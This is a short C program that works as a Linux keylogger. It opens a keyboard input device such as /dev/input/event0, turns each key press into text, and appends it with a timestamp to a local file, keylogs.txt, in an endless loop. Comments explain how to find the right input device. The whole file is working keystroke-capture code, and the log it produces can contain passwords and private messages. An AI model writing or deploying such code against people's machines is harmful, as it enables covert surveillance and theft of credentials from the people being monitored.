#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <time.h>
#include <errno.h>
#include <string.h>

#include "keycode.h"

    int main (){
	//might not be the same for all linux machines 
	//you can check what is  you keyboard device by :
	//ls /dev/input
	//sudo evtest /dev/input/event*  # Replace * with the event numbers from before
	const char *kyb_device = "/dev/input/event0";
    	const char *output_file = "keylogs.txt";

   	 int fd = open(kyb_device, O_RDONLY);
   	 if (fd == -1) {
        	fprintf(stderr, "Cannot open keyboard device %s: %s\n", kyb_device, strerror(errno));
        	exit(EXIT_FAILURE);
    	}

    FILE *output = fopen(output_file, "a");
    if (output == NULL) {
        fprintf(stderr, "Cannot open output file %s: %s\n", output_file, strerror(errno));
        close(fd);
        exit(EXIT_FAILURE);
    }

    struct input_event ev;
    time_t rawtime;
    struct tm *timeinfo;
    char buffer[80];

    while (1) {
        int Bytes_Read_Count = read(fd, &ev, sizeof(struct input_event));
        if (Bytes_Read_Count == sizeof(struct input_event)) {
            if (ev.type == EV_KEY && ev.value == 1) { // Key press event
                // Get the current time
                time(&rawtime);
                timeinfo = localtime(&rawtime);
                strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", timeinfo);

                // uncomment to Print to console
               // printf("Key %i (%s) pressed at %s\n", ev.code, keycode_to_string(ev.code), buffer);

                // Write to log file
                fprintf(output, "%s        pressed at :  %s\n", keycode_to_string(ev.code), buffer);
                fflush(output);
            }
        }
    }

    fclose(output);
    close(fd);
    return 0;
}

